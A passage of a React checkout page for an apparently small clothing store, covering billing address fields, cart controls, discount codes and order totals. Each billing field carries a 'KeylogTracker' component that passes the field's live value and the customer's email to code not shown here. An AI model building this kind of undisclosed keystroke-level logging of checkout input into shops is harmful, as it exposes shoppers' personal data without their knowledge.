                    onChange={handleInputChange}
                            className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.billingState ? 'border-error' : ''}`}
                            placeholder="Enter billing state"
                  />
                          <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="billingState" value={formData.billingState} page="checkout" context="billing" fieldType="text" />
                          {errors.billingState && <p className="text-error text-sm mt-1">{errors.billingState}</p>}
                </div>
                <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                    ZIP Code *
                  </label>
                  <input
                    type="text"
                            name="billingZipCode"
                            value={formData.billingZipCode}
                    onChange={handleInputChange}
                            className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.billingZipCode ? 'border-error' : ''}`}
                            placeholder="Enter billing ZIP code"
                  />
                          <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="billingZipCode" value={formData.billingZipCode} page="checkout" context="billing" fieldType="text" />
                          {errors.billingZipCode && <p className="text-error text-sm mt-1">{errors.billingZipCode}</p>}
                </div>
                <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                    Country *
                  </label>
                  <select
                            name="billingCountry"
                            value={formData.billingCountry}
                    onChange={handleInputChange}
                            className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.billingCountry ? 'border-error' : ''}`}
                  >
                    {COUNTRIES.map(country => (
                      <option key={country} value={country}>{country}</option>
                    ))}
                  </select>
                          <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="billingCountry" value={formData.billingCountry} page="checkout" context="billing" fieldType="select" />
                          {errors.billingCountry && <p className="text-error text-sm mt-1">{errors.billingCountry}</p>}
                </div>
              </div>
              </div>
            )}
                </div>
              </form>
            </div>

            {/* Submit Button */}
            <div>
              <button
                type="button"
                onClick={handleSubmit}
                disabled={isProcessing}
                className="w-full bg-gray-900 hover:bg-gray-800 text-white py-4 text-lg font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                {isProcessing ? 'Processing...' : `Pay ${formatPrice(total)}`}
              </button>
            </div>
          </div>

          {/* Order Summary */}
          <div className="space-y-6">
            <div className="bg-white border border-gray-300 p-8">
              <h2 className="text-2xl font-light mb-2" style={{ color: '#851A1B' }}>Order Summary</h2>
              <p className="italic text-gray-500 text-xs mb-6 font-light tracking-wide">Authenticity guaranteed. Comes with a full refund guarantee if you are not satisfied.</p>
              <div className="space-y-4">
                {state.items.map((item, index) => (
                  <div key={index} className="flex items-center space-x-4 p-4 bg-white border border-gray-200">
                    <div className="w-16 h-16 bg-gray-100 border border-gray-300 overflow-hidden flex items-center justify-center">
                      {item.product.images && item.product.images.length > 0 ? (
                        // eslint-disable-next-line @next/next/no-img-element
                        <img src={item.product.images[0]} alt={item.product.name} className="object-cover w-full h-full" />
                      ) : (
                        <span className="text-2xl">👕</span>
                      )}
                    </div>
                    <div className="flex-1">
                      <h3 className="font-medium text-gray-900">{item.product.name}</h3>
                      <p className="text-sm text-gray-600 mt-1">
                        {item.size} • {item.color === 'default' || item.color === 'original' ? 'Original Color' : item.color}
                      </p>
                      <div className="flex items-center gap-2 mt-2">
                        <button
                          type="button"
                          onClick={() => {
                            if (item.quantity > 1) {
                              dispatch({
                                type: 'UPDATE_QUANTITY',
                                payload: { 
                                  productId: item.productId,
                                  size: item.size,
                                  color: item.color,
                                  quantity: item.quantity - 1 
                                }
                              })
                            } else {
                              dispatch({
                                type: 'REMOVE_ITEM',
                                payload: { 
                                  productId: item.productId,
                                  size: item.size,
                                  color: item.color
                                }
                              })
                            }
                          }}
                          className="w-7 h-7 flex items-center justify-center border border-gray-300 hover:border-gray-900 transition-colors text-gray-700"
                        >
                          -
                        </button>
                        <span className="text-gray-900 font-medium min-w-[2rem] text-center">{item.quantity}</span>
                        <button
                          type="button"
                          onClick={() => {
                            dispatch({
                              type: 'UPDATE_QUANTITY',
                              payload: { 
                                productId: item.productId,
                                size: item.size,
                                color: item.color,
                                quantity: item.quantity + 1 
                              }
                            })
                          }}
                          className="w-7 h-7 flex items-center justify-center border border-gray-300 hover:border-gray-900 transition-colors text-gray-700"
                        >
                          +
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            dispatch({
                              type: 'REMOVE_ITEM',
                              payload: { 
                                productId: item.productId,
                                size: item.size,
                                color: item.color
                              }
                            })
                          }}
                          className="ml-4 text-gray-600 hover:text-gray-900 text-sm underline"
                        >
                          Remove
                        </button>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="font-medium text-gray-900">
                        {formatPrice(item.product.price * item.quantity)}
                      </p>
                    </div>
                  </div>
                ))}
              </div>

              {/* Discount Code */}
              <div className="border-t border-gray-300 pt-6 mt-6">
                {!appliedDiscount ? (
                  <div className="space-y-3">
                    <div className="flex gap-3">
                      <input
                        type="text"
                        placeholder="Enter discount code"
                        value={discountCode}
                        onChange={(e) => { setDiscountCode(e.target.value); setDiscountError('') }}
                        onKeyDown={(e) => e.key === 'Enter' && applyDiscountCode()}
                        className="flex-1 px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors"
                      />
                      <button
                        type="button"
                        onClick={applyDiscountCode}
                        className="px-6 py-3 bg-gray-900 text-white font-medium hover:bg-gray-800 transition-colors"
                      >
                        Apply
                      </button>
                    </div>
                    {discountError && <p className="text-sm text-red-600">{discountError}</p>}
                  </div>
                ) : (
                  <div className="flex items-center justify-between p-4 bg-gray-50 border border-gray-300">
                    <span className="text-sm text-gray-700">Discount applied: <strong>{appliedDiscount.code}</strong> (-{appliedDiscount.percent}%)</span>
                    <button
                      type="button"
                      onClick={() => { setAppliedDiscount(null); setDiscountCode('') }}
                      className="text-sm text-gray-600 hover:text-gray-900 underline"
                    >
                      Remove
                    </button>
                  </div>
                )}
              </div>

              <div className="border-t border-gray-300 pt-6 mt-6 space-y-3">
                <div className="flex justify-between">
                  <span className="text-gray-700">Subtotal</span>
                  <span className="text-gray-900 font-medium">{formatPrice(subtotal)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-700">Shipping</span>
                  <span className="text-gray-900 font-medium">
                    {shipping === 0 ? 'Free' : formatPrice(shipping)}
                  </span>
                </div>
                {discount > 0 && (
                  <div className="flex justify-between">
                    <span className="text-gray-700">Discount ({appliedDiscount?.code})</span>
                    <span className="text-gray-900 font-medium">-{formatPrice(discount)}</span>
                  </div>
                )}
                <div className="flex justify-between text-xl font-medium border-t border-gray-300 pt-4">
                  <span className="text-gray-900">Total</span>
                  <span className="text-gray-900">{formatPrice(total)}</span>
                </div>
              </div>
            </div>

            {/* Trust Indicators */}
            <div className="bg-white border border-gray-300 p-8">
              <h3 className="font-medium text-lg mb-6" style={{ color: '#851A1B' }}>Why Shop With Us?</h3>
              <div className="space-y-4">
                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 border border-gray-300 rounded-sm flex items-center justify-center bg-white">
                    <Truck className="w-5 h-5 text-gray-700" />
                </div>
                  <span className="text-gray-700">Free shipping all USA orders.</span>
                </div>
                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 border border-gray-300 rounded-sm flex items-center justify-center bg-white">
                    <Shield className="w-5 h-5 text-gray-700" />
                </div>
                  <span className="text-gray-700">Secure payment processing</span>
              </div>
                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 border border-gray-300 rounded-sm flex items-center justify-center bg-white">
                    <Lock className="w-5 h-5 text-gray-700" />
                  </div>
                  <span className="text-gray-700">30-day return policy</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}